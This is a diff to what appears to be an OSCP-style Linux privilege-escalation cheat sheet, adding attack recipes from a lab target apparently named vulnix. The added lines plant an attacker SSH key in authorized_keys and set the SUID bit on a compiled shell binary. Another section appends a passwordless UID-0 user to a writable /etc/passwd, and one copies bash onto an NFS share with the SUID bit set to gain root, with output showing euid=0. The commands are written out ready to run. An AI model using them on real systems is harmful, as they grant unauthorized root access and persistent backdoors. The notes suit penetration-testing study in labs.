@@ -649,7 +649,38 @@ perl /root/oscp/useful-tools/privesc/linux/Linux_Exploit_Suggester/Linux_Exploit
 python linprivchecker.py extended
 ```
 
+### unsing SSH keys for exploit
 
+1. create a user on the local kali machine with the same username as on the linux machine
+
+on target type "id"
+
+on kali create user
+```
+useradd -u 2008 vulnix
+```
+2. create ssh keys on local attacker machine then push them to the target adding ssh keys to authorized keys
+
+```
+
+On kali or attacker
+root@kali:~# ls /root/.ssh/
+root@kali:~# ssh-keygen
+root@kali:~# ls /root/.ssh/
+id_rsa  id_rsa.pub
+root@kali:~# cat /root/.ssh/id_rsa.pub
+
+on target
+
+$ mkdir .ssh
+$ cd .ssh
+$ echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC42NpxutFyfjQuOtZRiHzS/HRgCDQZZrrmizKrLmnhWy4RbzMqFc/URB22QtHkQLnX4libQkGKaSce2bEE2mF0DKB8oX/O9L+J7BYf5d7C6UQ1fLXN1Tg3Ls4QbKBrQGKPH14rdmzSe+ESKc5fE+cvBhB7f8Ub4HnZTDhLCSLJoyzNf85BkU/QjjWymxEXaoSDhg9vPgXEeQAAUCikkpcTwE5PVGG8z+m1fR0OZnzm45sfe2b+NI18owH60oGm8n8O6jOivsvlohXpNrcCm2Ago994zVA4V9ntPd6owXb77Wu1w8Zz1x1dK79QvIook18B6SIhnjJWyFgxHox2Gg8F root@kali > authorized_keys
+
+on kali or attacker
+
+root@kali:~# ssh user@*target*
+
+```
 
 ### SUID (Set owner User ID up on execution)
 
@@ -675,7 +706,7 @@ Building the SUID Shell binary
 gcc -o suid suid.c  
 For 32 bit:  
 gcc -m32 -o suid suid.c
-
+chmod 4777 suid
 
 ```
 create an SUID binary which is owned by root and which has its sticky bit set and has r/w/x permissions for all users.
@@ -741,11 +772,37 @@ grep -vE "nologin" /etc/passwd
 
 echo test > /etc/passwd 
 
+### edit the password file if you have r/w/x access or worldwritable
+
 echo 'kate::0:0:kate:/bin/bash' >> /etc/passwd
 
 cat /etc/passwd
 
 su kate
+
+#### use /bin/bash from the local attacker machine
+
+If you get a nfs share you can copy over /bin/bash and execute to add the user to root group
+
+```
+first mount the remote share as per standard mount commands then from attacker machine copy bash over and apply sticky bit as root
+
+root@kali:/tmp/nfs# cp /bin/bash /tmp/nfs/
+
+root@kali:/tmp/nfs# chmod 4777 bash
+
+Then ssh into the box as a standard user and run the bash command with -p
+
+./bash: /lib/i386-linux-gnu/libtinfo.so.5: no version information available (required by ./bash)
+
+bash-4.3# id
+
+uid=2008(vulnix) gid=2008(vulnix) euid=0(root) groups=0(root),2008(vulnix)
+
+bash-4.3# cd /root/
+
+```
+
 
 
 
